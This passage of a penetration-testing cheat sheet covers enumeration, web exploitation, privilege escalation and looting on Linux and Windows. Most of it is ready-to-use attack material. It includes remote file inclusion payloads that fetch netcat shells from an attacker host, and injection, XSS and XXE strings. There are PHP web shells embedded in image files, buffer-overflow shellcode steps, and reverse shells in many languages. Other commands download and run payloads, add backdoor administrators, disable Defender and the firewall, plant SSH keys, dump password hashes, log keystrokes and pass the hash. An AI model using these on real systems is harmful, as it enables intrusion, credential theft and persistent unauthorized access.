# dirsearch
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
./dirsearch.py -u http://$IP -e php,txt,html -x 404

# Crawling
dirhunt https://url.com/
hakrawler https://url.com/
```

Subdomain brute-force: https://github.com/aboul3la/Sublist3r
Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Subdomains%20Enumeration.md

**Default / Weak Login**

```
admin admin
admin password
admin <blank>
admin <servicename>
root root
root admin
root password
```

Usernames list: https://github.com/danielmiessler/SecLists/tree/master/Usernames

**LFI / RFI**

```bash
fimap -u "http://$IP/example.php?test="
curl -s http://$IP/gallery.php?page=/etc/passwd

# Use in "page=" parameter
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=../config.php
php://filter/convert.base64-encode/resource=../../../../../boot.ini
http://$IP/maliciousfile.txt%00

# LFI on Windows
LANG=../../windows/system32/drivers/etc/hosts%00
LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig

# Contaminating log files (inject PHP via User-Agent/request line, then include the log)
nc -v $IP 80
<?php echo shell_exec($_GET['cmd']);?>

# RFI
http://$IP/addguestbook.php?LANG=http://$IP:31/evil.txt%00
# evil.txt: <?php echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe") ?>

# RFI over SMB (Windows) - host php_cmd.php on an attacker SMB share, then:
lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c Invoke-WebRequest -Uri "http://10.10.14.42/nc.exe" -OutFile "C:\windows\system32\spool\drivers\color\nc.exe"
lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c "C:\windows\system32\spool\drivers\color\nc.exe" -e cmd.exe ATTACKER_IP 1234
```

Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

**SQL Injection**

```bash
# POST
sqlmap.py -r search-test.txt

# GET
sqlmap -u "http://$IP/index.php?id=1" --dbms=mysql

# Full run
sqlmap -u 'http://$IP:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch

# NoSQL
' || 'a'=='a
username[$ne]=0xtz&password[$ne]=0xtz
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

References:
- https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

**XSS / XXE**

```javascript
<script>alert("XSS")</script>
<script>alert(1)</script>

" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); </script>
```

```xml
<!-- XXE: read local files via a custom entity -->
<?xml version="1.0" ?>
<!DOCTYPE thp [
    <!ELEMENT thp ANY>
    <!ENTITY book SYSTEM "file:///etc/passwd">
]>
<thp>Hack &book;</thp>
```

**SQL Login Bypass**

Use Burp Suite → intercept the login request → send to Intruder → cluster-bomb attack with a SQLi bypass wordlist → check response length variation.

Reference: https://bobloblaw.gitbooks.io/security/content/sql-injections.html

**Bypass Image Upload**

```bash
# Change extension: .pHp3 or pHp3.jpg
# Modify mimetype: Content-type: image/jpeg
# Bypass getimagesize() and add a GIF header
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' shell.jpeg
exiftool -Comment='<?php echo "<pre>"; system($_GET["cmd"]); ?>' shell.jpg
```

### Online Crackers

- https://hashkiller.co.uk/Cracker
- https://www.cmd5.org/
- https://www.onlinehashcrack.com/
- https://gpuhash.me/
- https://crackstation.net/
- https://crack.sh/
- https://hash.help/
- https://passwordrecovery.io/
- http://cracker.offensive-security.com/

---

## Vulnerability Analysis

### Buffer Overflow

```
1. Send "A"*1024
2. Replace "A" with /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l LENGTH
3. On crash, find EIP offset:
   !mona findmsp
   /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q TEXT
   !mona pattern_offset eip
4. Confirm the location with "B" and "C"
5. Check for badchars (replace \x00 etc, compare ESP against a clean buffer):
   !mona config -set workingfolder c:\logs\%p
   !mona bytearray -b "\x00\x0d"
   # copy bytearray.txt into your exploit and resend
   !mona compare -f C:\logs\%p\bytearray.bin -a <ESP address>
6. Find JMP ESP:
   !mona modules
   !mona jmp -r esp -cpb '\x00\x0a\x0d'
   !mona find -s "\xff\xe4" -m PROGRAM/DLL-FALSE
   # Reverse the address bytes due to endianness, e.g. 5F4A358F -> \x8f\x35\x4a\x5f
7. Generate shellcode:
   msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=4433 -f python -e x86/shikata_ga_nai -b "\x00"
8. Final buffer:
   buffer = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90"*8 + shellcode
```

### Find Exploits - Searchsploit and Google

```bash
site:exploit-db.com apache 2.X.X
searchsploit Apache 2.X.X
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"
```

### Reverse Shells

```bash
# Linux
bash -i >& /dev/tcp/$IP/4443 0>&1
/bin/sh -i > /dev/tcp/x.x.x.x/6969 0<&1 2>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP 4443 >/tmp/f
nc -e /bin/sh $IP 4443

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="$IP";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Windows
nc -e cmd.exe $IP 4443

# From cmd (download & run a PS reverse shell)
C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://x.x.x.x/Invoke-PowerShellTcp.ps1')

# PHP
<?php $sock = fsockopen("$IP",1234); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);?>
php -r '$sock=fsockopen("x.x.x.x",6969);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",6969).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

Tool: https://github.com/mthbernardes/rsg (`rsg <interface> <port>`)

---

## Privilege Escalation

### Common

**Set Up a Web Server**

```bash
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S 0.0.0.0:80
```

Tool: https://github.com/sc0tfree/updog

**Set Up an FTP Server**

```bash
pip install pyftpdlib
python -m pyftpdlib -p 21 -w   # -w allows anonymous write access
```

**File Transfer**

```bash
# Sending machine
nc -w 3 [destination] 1234 < send.file

# Receiving machine
cmd /c nc.exe -l -v -p 1234 > PsExec.exe
```

### Linux

**Useful Commands**

```bash
# Spawning a better shell
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
# Ctrl+Z, then:
stty raw -echo; fg
# then:
reset; stty size

perl -e 'exec "/bin/sh";'
lua: os.execute('/bin/sh')
# vi: :!bash
# nmap interactive: !sh

# Access to more binaries
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Download all files from a web share
wget http://$IP:8080/ -r; mv $IP exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linprivchecker.py unix-privesc-check

# Writable directories
/tmp
/var/tmp

# Add user to sudoers
useradd hacker
passwd hacker
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

**Basic Info**

```bash
uname -a
env
id
cat /proc/version
cat /etc/issue
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/hosts

# Users with login
grep -vE "nologin" /etc/passwd

# Priv-enum scripts
./LinEnum.sh -t -k password -r LinEnum.txt
python linprivchecker.py extended
./unix-privesc-check standard
```

**Kernel Exploits**

```bash
site:exploit-db.com kernel version
perl /opt/Linux_Exploit_Suggester/Linux_Exploit_Suggester.pl -k 2.6
python linprivchecker.py extended
```

**Programs Running as Root**

```bash
ps aux
```

**Installed Software**

```bash
# Common install paths
/usr/local/  /usr/local/src  /usr/local/bin  /opt/  /home  /var/  /usr/src/

# Debian
dpkg -l
# CentOS/openSUSE/Fedora/RHEL
rpm -qa
# OpenBSD/FreeBSD
pkg_info
```

**Weak / Reused / Plaintext Passwords**

Check database config files, databases, and common weak combinations (`username:username`, `username:password`, etc).

```bash
./LinEnum.sh -t -k password
grep -rnw '/' -ie 'pass' --color=always
grep -rnw '/' -ie 'DB_PASS' --color=always
grep -rnw '/' -ie 'DB_PASSWORD' --color=always
grep -rnw '/' -ie 'DB_USER' --color=always
```

**Inside Service**

```bash
netstat -anlp
netstat -ano
```

**SUID Misconfiguration**

Binaries with SUID set run as the file owner (often root) regardless of who executes them.

```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# All perms 777
find / -perm -777 -type f 2>/dev/null

# SUID owned by root, current user perspective
find / -user root -perm -4000 -print 2>/dev/null

# Writable dirs for current user/group
find / -perm /u+w,g+w -type d -user `whoami` 2>/dev/null
```

**Unmounted Filesystems**

```bash
mount -l
```

**Cronjob**

```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

**SSH Keys** (check all home directories)

```bash
cat ~/.ssh/authorized_keys
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_dsa_key
```

**Bad Path Configuration**

```bash
export PATH=/tmp:$PATH   # requires a user interaction to trigger
```

**Scripts**

SUID helper binary:

```c
int main(void){
  setresuid(0, 0, 0);
  system("/bin/bash");
}
// gcc suid.c -o suid
```

PS monitor for cron (catch short-lived root processes):

```bash
#!/bin/bash
IFS=$'\n'
old_process=$(ps -eo command)
while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
    sleep 1
    old_process=$new_process
done
```

**Linux Privesc Tools**

- [GTFOBins](https://gtfobins.github.io/)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
- [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)

### Windows

Checklist, in order: kernel exploits → cleartext passwords → reconfigure service parameters → inside service → programs running as root → installed software → scheduled tasks → weak passwords.

**Basic Info**

```cmd
systeminfo
set
hostname
net users
net user user1
net localgroups
accesschk.exe -uwcqv "Authenticated Users" *
netsh firewall show state
netsh firewall show config
whoami /priv
dir /a   :: hidden & unhidden files
dir /Q   :: show permissions
```

**Kernel Exploits**

```cmd
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
:: search
site:exploit-db.com windows XX XX
```

**Cleartext Passwords**

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"   :: autologin
reg query "HKCU\Software\ORL\WinVNC3\Password"                          :: VNC
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"                :: SNMP
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"                    :: PuTTY

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

**Reconfigure Service Parameters**

Look for unquoted service paths and weak service permissions.

Reference: https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/

**Dump Process for Passwords**

```powershell
Get-Process
./procdump64.exe -ma $PID FF
Select-String -Path .\*.dmp -Pattern 'password' > 1.txt
type 1.txt | findstr /s /i "admin"
```

**Inside Service**

```cmd
netstat /a
netstat -ano
```

**Installed Software**

```cmd
tasklist /SVC
net start
reg query HKEY_LOCAL_MACHINE\SOFTWARE
DRIVERQUERY

:: Check
C:\Program files
C:\Program files (x86)
Home directory of the user
```

**Scheduled Tasks**

```cmd
schtasks /query /fo LIST /v
:: Also check: c:\WINDOWS\SchedLgU.Txt
```

**Weak Passwords**

```cmd
ncrack -vv --user george -P /usr/.../passwords.txt rdp://$IP
```

**Add User and Enable RDP**

```cmd
net user haxxor Haxxor123 /add
net localgroup Administrators haxxor /add
net localgroup "Remote Desktop Users" haxxor /add

sc stop WinDefend
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Powershell "Sudo" for Windows**

```powershell
$pw = ConvertTo-SecureString "EnterPasswordHere" -AsPlainText -Force
$pp = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "EnterDomainName\EnterUserName",$pw
$script = "C:\Users\EnterUserName\AppData\Local\Temp\test.bat"
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process $script -verb Runas}'

powershell -ExecutionPolicy Bypass -File xyz.ps1
```

**Windows Downloads**

```bash
# bitsadmin
bitsadmin /transfer mydownloadjob /download /priority normal http://<attacker>/nc.exe C:\Users\%USERNAME%\AppData\local\temp\nc.exe

# certutil
certutil.exe -urlcache -split -f "http://<attacker>/Powerless.bat" Powerless.bat

# PowerShell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.1.111/file.exe','C:\Users\user\Desktop\file.exe')"

# FTP (from a reverse shell)
echo open $IP > ftp.txt
echo USER anonymous >> ftp.txt
echo ftp >> ftp.txt
echo bin >> ftp.txt
echo GET file >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

Creating a wget VBScript on Windows: https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt

**Windows SMB Server for File Transfer**

```bash
# Attacker machine
python /usr/share/doc/python-impacket/examples/smbserver.py

# Victim machine
copy \\$IP\Lab\wce.exe .    :: download
copy wtf.jpg \\$IP\Lab      :: upload
```

**Pass the Hash**

```bash
# hashdump e.g. admin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::

msf5 > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > set rhosts 10.10.0.100
msf5 exploit(windows/smb/psexec) > set smbuser admin2
msf5 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7
msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
```

**Scripts**

Useradd (C, compile with MinGW):

```c
#include <stdlib.h>
int main() {
  system("net user <username> <password> /add && net localgroup administrators <username> /add");
  return 0;
}
// i686-w64-mingw32-gcc -o useradd.exe useradd.c
```

Powershell Run As:

```cmd
echo $username = '<username>' > runas.ps1
echo $securePassword = ConvertTo-SecureString "<password>" -AsPlainText -Force >> runas.ps1
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
```

Powershell Reverse Shell:

```powershell
Set-ExecutionPolicy Bypass
$client = New-Object System.Net.Sockets.TCPClient('10.11.1.111',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**Windows Privesc / Enum Tools**

- [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)
- [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
- [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)
- [WindowsExploits (precompiled)](https://github.com/abatchy17/WindowsExploits)

**Windows Port Forwarding**

```bash
# Forward local 8080 to REMOTE_HOST:PORT via SSH_SERVER
ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER

# Run in victim (e.g. WinRM 5985)
plink -l LOCALUSER -pw LOCALPASSWORD LOCALIP -R 5985:127.0.0.1:5985 -P 221
```

---

## Loot

### Linux

**Passwords and Hashes**

```bash
cat /etc/passwd
cat /etc/shadow
unshadow passwd shadow > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

**Dualhomed**

```bash
ifconfig -a
arp -a
```

**Tcpdump**

```bash
tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not $IP and dst not $IP
```

**Interesting Files**

```bash
# Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql
use auxiliary/sniffer/psnuffle

.ssh/
.bash_history
```

**SSH Keys**

```bash
mkdir /root/.ssh 2>/dev/null; echo '<your ssh-key>' >> /root/.ssh/authorized_keys
```

**Mail**

```
/var/mail
/var/spool/mail
```

**GUI**

```bash
echo $DESKTOP_SESSION
echo $XDG_CURRENT_DESKTOP
echo $GDMSESSION
```

### Windows

**Passwords and Hashes**

```bash
wce32.exe -w
wce64.exe -w
fgdump.exe

# Without tools
reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system

# Meterpreter
hashdump
load mimikatz
msv
```

**Dualhomed**

```bash
ipconfig /all
route print
arp -a
```

**Tcpdump**

```bash
# Meterpreter
run packetrecorder -li
run packetrecorder -i 1
```

**Interesting Files**

```bash
# Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql
hashdump
keyscan_start
keyscan_dump
keyscan_stop
webcam_snap

# Cat files in meterpreter
cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt

# Recursive search
dir /s
```

### Cloud

**pentest-ec2-manager**

A set of utilities for quickly starting, SSH-ing into, and stopping temporary EC2 instances for out-of-band web tests (SSRF, reverse shells, DNS/HTTP/other daemons). Manages a *single* EC2 instance picked by `key-name`, `image-id`, `security-group-name`, and `instance-type`. Common use case: SSRF testing, to confirm an out-of-band request reaches an attacker-controlled machine.

> Files in the repo are preconfigured/hardcoded with specific settings at the top of each script — change as needed.

Install (requires an AWS account and AWS Access/Secret Key):

```bash
./init.sh
```

This updates repos, installs prerequisites (ssh, cron, jq, ruby, rubygems, awscli, bundler, `aws-sdk-ec2` gem), configures AWS credentials, creates security groups/key pairs, adds aliases to `.bashrc`, and adds a cron job that checks instance status every two hours.

Aliases added to `~/.bashrc`:

- `startpentestec2` — start (or create) the EC2 instance
- `stoppentestec2` — stop the instance
- `terminatepentestec2` — terminate the instance (deletes its EBS volume)
- `sshpentestec2` — SSH into the managed instance
- `getpentestec2` — get the instance's IPv4 address
- `checkpentestec2` — print instance status

Direct script usage:

```bash
ruby aws-manager.rb [options] <func> <name>

# func: start | stop | restart | terminate | address | status | ssh | notify

# Options:
#   -h, --help
#   -q, --quiet
#   -v, --verbose
#       --debug
#   -d, --aws-path=PATH
#       --profile=NAME
#   -p, --region=REGION            (default: us-east-1)
#   -i, --image-id=ID
#   -k, --key-name=KEY
#   -s, --security-group-name=NAME
#   -t, --instance-type=TYPE       (default: t2.micro)
#   -u, --user=USER                (default: ec2-user)
```

**TODO**

- Test, bug fixes
- Support different AWS regions (currently fixed to one region)
- Support more than one instance
